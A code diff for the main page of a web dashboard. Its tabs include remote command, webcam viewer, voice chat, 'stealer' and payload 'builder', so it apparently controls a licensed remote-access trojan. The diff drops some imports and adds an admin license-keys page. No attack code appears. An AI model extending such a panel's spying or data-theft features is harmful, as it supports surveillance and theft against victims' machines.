@@ -8,17 +8,9 @@ import { FunTab } from "@/components/fun-tab"
 import { FilesTab } from "@/components/files-tab"
 import { DesignSettings } from "@/components/design-settings"
 import { AdminPage } from "@/components/admin-page"
-import { WelcomePage } from "@/components/welcome-page"
-import { DesignPage } from "@/components/design-page"
 import { BuilderPage } from "@/components/builder-page"
-import { RemoteCmdTab } from "@/components/remote-cmd-tab"
-import { WebcamViewer } from "@/components/webcam-viewer"
-import { VoiceChatTab } from "@/components/voice-chat-tab"
-import { StealerTab } from "@/components/stealer-tab"
 import { AuthPage } from "@/components/auth-page"
-import { LicenseActivationPage } from "@/components/license-activation-page"
-import { Footer } from "@/components/footer"
-import { UsersPage } from "@/components/users-page"
+import { AdminKeysPage } from "@/components/admin-keys-page"
 import { hasValidLicense, type User as DBUser } from "@/lib/db"
 
 export type User = {
@@ -34,7 +26,7 @@ export type User = {
 
 export type TabType = "desktop" | "webcam" | "fun" | "files" | "cmd" | "voice" | "stealer" | "builder" | "design"
 
-export type PageType = "home" | "design" | "builder" | "admin" | "users"
+export type PageType = "home" | "design" | "builder" | "admin" | "users" | "keys"
 
 interface AuthState {
   isAuthenticated: boolean
@@ -266,6 +258,10 @@ export default function Home() {
 
     if (activePage === "builder") {
       return <BuilderPage />
+    }
+
+    if (activePage === "keys") {
+      return <AdminKeysPage />
     }
 
     if (activePage === "users") {
